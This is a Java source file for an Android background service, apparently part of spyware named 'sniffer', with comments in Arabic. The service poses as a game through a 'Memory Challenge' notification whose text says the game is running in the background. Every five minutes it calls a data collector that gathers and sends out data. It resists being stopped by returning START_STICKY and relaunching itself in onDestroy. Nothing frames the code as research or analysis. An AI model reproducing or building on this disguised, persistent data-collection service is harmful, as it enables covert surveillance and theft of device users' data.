package com.v8.global.sniffer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import androidx.core.app.NotificationCompat;
import com.v8.global.sniffer.utils.Constants;
import com.v8.global.sniffer.utils.DataCollector;

public class BackgroundService extends Service {

    private Handler handler = new Handler(Looper.getMainLooper());
    private DataCollector dataCollector;
    private Runnable collectRunnable;
    private boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        
        // تهيئة جامع البيانات
        dataCollector = new DataCollector(this);
        
        // تشغيل الخدمة في المقدمة
        startForeground();
        
        // بدء عملية الجمع التلقائي
        startCollecting();
    }

    private void startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // إنشاء قناة الإشعارات
            NotificationChannel channel = new NotificationChannel(
                "background_channel",
                "Memory Challenge Service",
                NotificationManager.IMPORTANCE_LOW
            );
            
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);

            // إنشاء الإشعار
            Notification notification = new NotificationCompat.Builder(this, "background_channel")
                    .setContentTitle("Memory Challenge")
                    .setContentText("اللعبة تعمل في الخلفية...")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build();

            // تشغيل الخدمة في المقدمة
            startForeground(1001, notification);
        }
    }

    private void startCollecting() {
        collectRunnable = new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    // جمع وإرسال البيانات
                    dataCollector.collectAndSend();
                    
                    // التكرار كل 5 دقائق
                    handler.postDelayed(this, Constants.COLLECT_INTERVAL);
                }
            }
        };
        
        // بدء الجمع بعد دقيقة من التشغيل
        handler.postDelayed(collectRunnable, 60 * 1000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // إعادة تشغيل الخدمة إذا توقفت
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        
        // إيقاف الجمع
        isRunning = false;
        if (handler != null && collectRunnable != null) {
            handler.removeCallbacks(collectRunnable);
        }
        
        // إعادة تشغيل الخدمة
        Intent intent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
}
